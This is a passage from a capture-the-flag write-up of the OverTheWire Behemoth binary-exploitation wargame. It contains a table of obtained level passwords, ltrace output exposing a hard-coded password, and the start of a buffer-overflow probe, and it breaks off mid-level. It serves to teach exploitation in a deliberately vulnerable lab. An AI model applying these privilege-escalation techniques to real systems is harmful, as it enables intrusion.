Mono"}.c74{font-size:18pt;color:#0c343d}.c61{color:#6aa84f;font-size:12pt}.c42{margin-left:72pt;padding-left:0pt}.c43{margin-left:36pt;padding-left:0pt}.c35{background-color:#f3f3f3;color:#cc0000}.c78{font-size:9pt}.c45{height:11pt}.c71{font-size:12pt}.c39{font-style:italic}.c56{vertical-align:sub}.c63{font-size:14pt}.c50{font-family:"Roboto Mono"}.c59{color:#0b5394}.c75{font-size:11pt}.c29{font-weight:700}.c80{font-size:16pt}.c10{height:0pt}.c84{font-size:13pt}.c83{height:16pt}.c76{page-break-after:avoid}.c77{font-size:19pt}.c16{font-size:10pt}.c68{color:#4a86e8}.title{padding-top:10pt;color:#980000;font-size:42pt;padding-bottom:0pt;font-family:"Roboto Mono";line-height:1.0;page-break-after:avoid;orphans:2;widows:2;text-align:center}.subtitle{padding-top:6pt;color:#666666;font-size:13pt;padding-bottom:0pt;font-family:"Roboto Mono";line-height:1.3;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:center}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#0b5394;font-size:16pt;padding-bottom:3pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:20pt;color:#0b5394;font-size:17pt;padding-bottom:3pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:20pt;color:#516d7b;font-size:15pt;padding-bottom:3pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:8pt;color:#936ec1;font-size:12.5pt;padding-bottom:2pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:2pt;color:#6aa84f;font-size:12pt;padding-bottom:0pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c57"><div><h1 class="c19 c83" id="h.li0bjdopo6z"><span class="c51 c50 c59 c80"></span></h1></div><p class="c36 c54 title" id="h.nj23sjpj5u97"><span class="c22 c49">Behemoth</span></p><p class="c36 c70 subtitle" id="h.dw2dac9r7xzm"><span class="c63">A look into the exploitation of vulnerable binaries</span></p><p class="c37"><span class="c22 c68 c78">&nbsp; &nbsp;</span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 345.92px; height: 358.88px;"><img alt="" src="images/image8.png" style="width: 345.92px; height: 358.88px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c47"><span class="c22 c74">0xd4y</span></p><p class="c47"><span class="c22 c80">April</span><span class="c51 c33 c80">&nbsp;20, 2021</span></p><p class="c9"><span class="c27 c84"></span></p><p class="c36 c86"><span class="c22 c48">0xd4y Writeups</span></p><p class="c12"><span class="c50 c29">LinkedIn: </span><span class="c34 c22"><a class="c6" href="https://www.google.com/url?q=https://www.linkedin.com/in/segev-eliezer/&amp;sa=D&amp;source=editors&amp;ust=1653865765679122&amp;usg=AOvVaw20yVe9TZbNRrit5cjCh7la">https://www.linkedin.com/in/segev-eliezer/</a></span><span class="c51 c33 c71">&nbsp;</span></p><p class="c12"><span class="c29 c50">Email: </span><span class="c22 c34"><a class="c6" href="mailto:0xd4yWriteups@gmail.com">0xd4yWriteups@gmail.com</a></span></p><p class="c12"><span class="c50 c29">Web:</span><span class="c22">&nbsp;</span><span class="c34 c22"><a class="c6" href="https://www.google.com/url?q=https://0xd4y.github.io/Writeups/&amp;sa=D&amp;source=editors&amp;ust=1653865765679892&amp;usg=AOvVaw23x5CqH5aRkEdVU5Z7lpKm">https://0xd4y.github.io/</a></span><span class="c22">&nbsp;</span></p><p class="c70 c36 c76 subtitle" id="h.uzriz95hwg4"><span class="c22 c39 c79">Table of Contents</span></p><p class="c36 c72"><span class="c23 c33 c29"><a class="c6" href="#h.skkcx3243q92">Executive Summary</a></span><span class="c23 c33 c29">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c23 c33 c29"><a class="c6" href="#h.skkcx3243q92">3</a></span></p><p class="c36 c53"><span class="c23 c33 c29"><a class="c6" href="#h.y7voaxif6jkg">Attack Narrative</a></span><span class="c23 c33 c29">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c23 c33 c29"><a class="c6" href="#h.y7voaxif6jkg">4</a></span></p><p class="c21"><span class="c15"><a class="c6" href="#h.777qhcmdltsz">Behemoth 0</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.777qhcmdltsz">4</a></span></p><p class="c21"><span class="c15"><a class="c6" href="#h.2eaegv275h63">Behemoth 1</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.2eaegv275h63">5</a></span></p><p class="c30"><span class="c15"><a class="c6" href="#h.vs95uriulwwh">Method 1</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.vs95uriulwwh">8</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.27qtgfoy0njb">POC</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.27qtgfoy0njb">9</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.vkme7fphqreh">Shellcode Execution</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.vkme7fphqreh">9</a></span></p><p class="c30"><span class="c15"><a class="c6" href="#h.lu6rrk3nt1i">Method 2</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.lu6rrk3nt1i">12</a></span></p><p class="c21"><span class="c15"><a class="c6" href="#h.9e7hwp9wx39h">Behemoth 2</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.9e7hwp9wx39h">13</a></span></p><p class="c30"><span class="c15"><a class="c6" href="#h.7p5xlkqevfbu">Binary Analysis</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.7p5xlkqevfbu">13</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.x3bq9jsdb8v7">Behavior</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.x3bq9jsdb8v7">13</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.oynz5ozays6k">Ghidra</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.oynz5ozays6k">13</a></span></p><p class="c30"><span class="c15"><a class="c6" href="#h.er0aqui9c1x">Binary Exploitation</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.er0aqui9c1x">15</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.9vyv757ij9yj">Path Privesc (Touch)</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.9vyv757ij9yj">15</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.pshhhr55tmpg">Path Privesc (Cat)</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.pshhhr55tmpg">15</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.6af8invi43tw">Symbolic Link</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.6af8invi43tw">16</a></span></p><p class="c21"><span class="c15"><a class="c6" href="#h.iwgdpudcydgl">Behemoth 3</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.iwgdpudcydgl">17</a></span></p><p class="c30"><span class="c15"><a class="c6" href="#h.sazhas4fyil">Binary Analysis</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.sazhas4fyil">17</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.cpklvm5s2jrm">Behavior</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.cpklvm5s2jrm">17</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.s2k22fdd1mwn">Ghidra</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.s2k22fdd1mwn">18</a></span></p><p class="c30"><span class="c15"><a class="c6" href="#h.mez1g56y3rvw">Discovery of Format String Vulnerability</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.mez1g56y3rvw">19</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.u0pizz3c8rpk">Memory Addresses of Useful Functions</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.u0pizz3c8rpk">19</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.3jzjlah745hv">Overwriting Puts</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.3jzjlah745hv">20</a></span></p><p class="c36 c65"><span class="c15"><a class="c6" href="#h.4zk650y4xnzm">Constructing Payload With GDB</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.4zk650y4xnzm">20</a></span></p><p class="c30"><span class="c15"><a class="c6" href="#h.jagnc9qowxus">Exploit Development</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.jagnc9qowxus">21</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.icza0znvroe2">Controlling Puts Address</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.icza0znvroe2">22</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.z7u0fjslsnt8">Popping a Shell</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.z7u0fjslsnt8">24</a></span></p><p class="c21"><span class="c15"><a class="c6" href="#h.eoybw49l4xbw">Behemoth 4</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.eoybw49l4xbw">25</a></span></p><p class="c30"><span class="c15"><a class="c6" href="#h.c5nq5aylye9u">Binary Analysis</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.c5nq5aylye9u">26</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.eu475ejo4tfp">Behavior</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.eu475ejo4tfp">26</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.vx8y9qi7edp2">Ghidra</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.vx8y9qi7edp2">26</a></span></p><p class="c30"><span class="c15"><a class="c6" href="#h.rmftonkmrg2x">Binary Exploitation</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.rmftonkmrg2x">27</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.c06ihpx7yw4e">Symbolic Link Attack</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.c06ihpx7yw4e">27</a></span></p><p class="c21"><span class="c15"><a class="c6" href="#h.7apgrhmap56f">Behemoth 5</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.7apgrhmap56f">28</a></span></p><p class="c30"><span class="c15"><a class="c6" href="#h.snnuhjwulxzn">Binary Analysis</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.snnuhjwulxzn">28</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.yodf5dnlygui">Ghidra</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.yodf5dnlygui">28</a></span></p><p class="c30"><span class="c15"><a class="c6" href="#h.ucvx5cuzou25">Catching Behemoth6 Password Through UDP</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.ucvx5cuzou25">31</a></span></p><p class="c21"><span class="c15"><a class="c6" href="#h.1iiwc3vpzmaj">Behemoth 6</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.1iiwc3vpzmaj">31</a></span></p><p class="c30"><span class="c15"><a class="c6" href="#h.tihwa7xhbihg">Ghidra</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.tihwa7xhbihg">32</a></span></p><p class="c30"><span class="c15"><a class="c6" href="#h.fngzaxqi0ncb">Abusing popen()</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.fngzaxqi0ncb">33</a></span></p><p class="c21"><span class="c15"><a class="c6" href="#h.tqwpdz749mlq">Behemoth 7</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.tqwpdz749mlq">34</a></span></p><p class="c30"><span class="c15"><a class="c6" href="#h.xjoju0hpie6u">Binary Analysis</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.xjoju0hpie6u">34</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.lza0jils5m5d">Behavior</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.lza0jils5m5d">34</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.88k4lr9djkg2">Ghidra</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.88k4lr9djkg2">35</a></span></p><p class="c30"><span class="c15"><a class="c6" href="#h.ltv1zu8li5yq">Constructing Payload</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.ltv1zu8li5yq">37</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.brbnafv8klgo">Calculating EIP Offset</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.brbnafv8klgo">37</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.vmauwlddokdj">Shellcode Address</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.vmauwlddokdj">38</a></span></p><p class="c26"><span class="c15"><a class="c6" href="#h.gb02temjdnc4">Final Payload</a></span><span class="c15">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c15"><a class="c6" href="#h.gb02temjdnc4">39</a></span></p><p class="c36 c64"><span class="c23 c33 c29"><a class="c6" href="#h.i7o2yd759joa">Conclusion</a></span><span class="c23 c33 c29">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c23 c33 c29"><a class="c6" href="#h.i7o2yd759joa">41</a></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><h1 class="c36 c67" id="h.skkcx3243q92"><span class="c33 c41">Executive Summary</span></h1><p class="c9"><span class="c13"></span></p><p class="c12"><span>In contrast to </span><span class="c34"><a class="c6" href="https://www.google.com/url?q=https://0xd4y.github.io/Writeups/Misc/Narnia%2520Writeup.pdf&amp;sa=D&amp;source=editors&amp;ust=1653865765692359&amp;usg=AOvVaw1Xq8CpHqiNKgfYHfxwYd2z">Narnia</a></span><span>, the source code for each binary is not given. &nbsp;Nevertheless, all eight binaries were successfully analyzed and exploited. Attack techniques such as shellcode injection, format string exploitation, and path privilege escalation are covered in this report. Some binaries were more of a reverse engineering exercise (</span><span class="c34"><a class="c6" href="#h.7apgrhmap56f">Behemoth 5</a></span><span>&nbsp;</span><span>and </span><span class="c34"><a class="c6" href="#h.1iiwc3vpzmaj">Behemoth 6</a></span><span>&nbsp;for example)</span><span>&nbsp;while others typically involved buffer overflow and format string exploits such as in </span><span class="c34"><a class="c6" href="#h.tqwpdz749mlq">Behemoth 7</a></span><span>, a challenge</span><span class="c13">&nbsp;which showcases an interesting way of bypassing shellcode filters. </span></p><p class="c12"><span>The binaries were mainly vulnerable due to a lack of boundary checks and input validation. It is critical that the SETUID bits of these binaries are removed until the remedies in the </span><span class="c34"><a class="c6" href="#h.i7o2yd759joa">Conclusion</a></span><span>&nbsp;section</span><span class="c13">&nbsp;are observed. Below is the full listing of all passwords obtained from the compromised users:</span></p><a id="t.0b10455f0493f0100ad22866a0bdc10dd95b7e38"></a><a id="t.0"></a><table class="c5"><tr class="c10"><td class="c31" colspan="1" rowspan="1"><p class="c28"><span class="c55 c33 c29">Username</span></p></td><td class="c31" colspan="1" rowspan="1"><p class="c28"><span class="c33 c29 c55">Password</span></p></td></tr><tr class="c10"><td class="c31" colspan="1" rowspan="1"><p class="c14"><span class="c15">behemoth0</span></p></td><td class="c31" colspan="1" rowspan="1"><p class="c14"><span class="c15">behemoth0</span></p></td></tr><tr class="c10"><td class="c31" colspan="1" rowspan="1"><p class="c14"><span class="c15">behemoth1</span></p></td><td class="c31" colspan="1" rowspan="1"><p class="c14"><span class="c15">aesebootiv</span></p></td></tr><tr class="c10"><td class="c31" colspan="1" rowspan="1"><p class="c14"><span class="c15">behemoth2</span></p></td><td class="c31" colspan="1" rowspan="1"><p class="c14"><span class="c15">eimahquuof</span></p></td></tr><tr class="c10"><td class="c31" colspan="1" rowspan="1"><p class="c14"><span class="c15">behemoth3</span></p></td><td class="c31" colspan="1" rowspan="1"><p class="c14"><span class="c15">nieteidiel</span></p></td></tr><tr class="c10"><td class="c31" colspan="1" rowspan="1"><p class="c14"><span class="c15">behemoth4</span></p></td><td class="c31" colspan="1" rowspan="1"><p class="c14"><span class="c15">ietheishei</span></p></td></tr><tr class="c10"><td class="c31" colspan="1" rowspan="1"><p class="c14"><span class="c15">behemoth5</span></p></td><td class="c31" colspan="1" rowspan="1"><p class="c14"><span class="c15">aizeeshing</span></p></td></tr><tr class="c10"><td class="c31" colspan="1" rowspan="1"><p class="c14"><span class="c15">behemoth6</span></p></td><td class="c31" colspan="1" rowspan="1"><p class="c14"><span class="c15">mayiroeche</span></p></td></tr><tr class="c10"><td class="c31" colspan="1" rowspan="1"><p class="c14"><span class="c15">behemoth7</span></p></td><td class="c31" colspan="1" rowspan="1"><p class="c14"><span class="c15">baquoxuafo</span></p></td></tr><tr class="c10"><td class="c31" colspan="1" rowspan="1"><p class="c14"><span class="c15">behemoth8</span></p></td><td class="c31" colspan="1" rowspan="1"><p class="c14"><span class="c15">pheewij7Ae</span></p></td></tr></table><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><h1 class="c67 c36" id="h.y7voaxif6jkg"><span class="c66">Attack Narrative</span></h1><p class="c9"><span class="c13"></span></p><p class="c12"><span>The credentials to the first user, behemoth0, was given as behemoth0 (the credentials are behemoth0:behemoth0). The ssh service is open on port 2221, and this ssh session provided the means for allowing the analysis of the binaries discussed in this report.</span></p><h2 class="c19" id="h.777qhcmdltsz"><span class="c46 c22">Behemoth 0</span></h2><p class="c12"><span class="c13">Running the strings command on the binary reveals some interesting strings:</span></p><p class="c12"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 202.93px; height: 575.63px;"><img alt="" src="images/image2.png" style="width: 202.93px; height: 575.63px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c12"><span>However, trying any of these potential passwords results in an &ldquo;Access denied..&rdquo; message. Using </span><span class="c29">ltrace</span><span>, a library call tracer, the system calls of the binary can be seen upon inputting a password:</span></p><a id="t.91e47c8070d4724ba12436ceddbc2c6faef52d09"></a><a id="t.1"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c38"><span class="c8">&#9484;&#9472;[&#10007;]&#9472;[0xd4y@Writeup]&#9472;[~/business/other/overthewire/behemoth/0]<br>&#9492;&#9472;&#9472;&#9596; </span><span class="c3">$ltrace</span><span class="c8">&nbsp;./behemoth0 <br>__libc_start_main(0x80485b1, 1, 0xffbafd14, 0x8048680 &lt;unfinished ...&gt;<br></span><span class="c4">printf</span><span class="c8">(</span><span class="c0">&quot;Password: &quot;</span><span class="c8">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 10<br>__isoc99_scanf(0x804874c, 0xffbafc0b, 0xf7f3e000, 0Password: 123<br>) &nbsp; &nbsp; = 1<br>strlen(</span><span class="c0">&quot;OK^GSYBEX^Y&quot;</span><span class="c8">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 11<br>strcmp(</span><span class="c0">&quot;123&quot;</span><span class="c8">, </span><span class="c0">&quot;eatmyshorts&quot;</span><span class="c8">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = -1<br>puts(</span><span class="c0">&quot;Access denied..&quot;</span><span class="c8">Access denied..<br>) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 16<br>+++ exited (status 0) +++</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span>The binary is comparing the user input to the secret password by using the strcmp (string compare) function. Trying out the </span><span class="c29">eatmyshorts</span><span class="c13">&nbsp;password, we are given access to the next level:</span></p><p class="c12"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 413.00px; height: 103.00px;"><img alt="" src="images/image5.png" style="width: 413.00px; height: 103.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><h2 class="c19" id="h.2eaegv275h63"><span class="c46 c22">Behemoth 1</span></h2><p class="c12"><span>Now with a shell as the behemoth1 user, we can maintain persistence by grabbing the password from </span><span class="c29">/etc/behemoth_pass</span><span>&nbsp;directory. </span></p><p class="c12"><span class="c13">Running the behemoth1 binary, the following output can be seen:</span></p><p class="c12"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 415.00px; height: 86.00px;"><img alt="" src="images/image6.png" style="width: 415.00px; height: 86.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c12"><span class="c13">After downloading the binary and using ltrace, the following output is found:</span></p><a id="t.df878f8d86a0c5acaeb8b219495d70cf59423d8b"></a><a id="t.2"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">&#9484;&#9472;[0xd4y@Writeup]&#9472;[~/business/other/overthewire/behemoth/1]<br>&#9492;&#9472;&#9472;&#9596; </span><span class="c3">$ltrace</span><span class="c8">&nbsp;./behemoth1 <br>__libc_start_main(0x804844b, 1, 0xffc01bc4, 0x8048480 &lt;unfinished ...&gt;<br></span><span class="c4">printf</span><span class="c8">(</span><span class="c0">&quot;Password: &quot;</span><span class="c8">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 10<br>gets(0xffc01ad5, 0xf7f11080, 0, 0xf7d25b7ePassword: a<br>) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 0xffc01ad5<br>puts(</span><span class="c0">&quot;Authentication failure.\nSorry.&quot;</span><span class="c8">Authentication failure.<br>Sorry.<br>) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 31<br>+++ exited (status 0) +++</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">This binary is a little bit more secure in the sense that the password is not exposed by the strcmp function. Before trying to reverse engineer this binary, it is important to check for possible buffer overflow vulnerabilities. This can be done by sending a large input as follows:</span></p><a id="t.3d2ba5e769c1bf2f2dd7300a6e40aa9bdc378312"></a><a id="t.3"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">&#9484;&#9472;[0xd4y@Writeup]&#9472;[~/business/other/overthewire/behemoth/1]<br>&#9492;&#9472;&#9472;&#9596; </span><span class="c3">$python</span><span class="c8">&nbsp;-c </span><span class="c0">&quot;print &#39;A&#39;*1000&quot;</span><span class="c8">|xclip -sel clip</span></p></td></tr></table><p class="c36 c40"><span class="c13"></span></p><a id="t.25c6638f29deb3153d305df97b572cce8137c875"></a><a id="t.4"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth1@behemoth:/behemoth$ ./behemoth1 <br>Password: 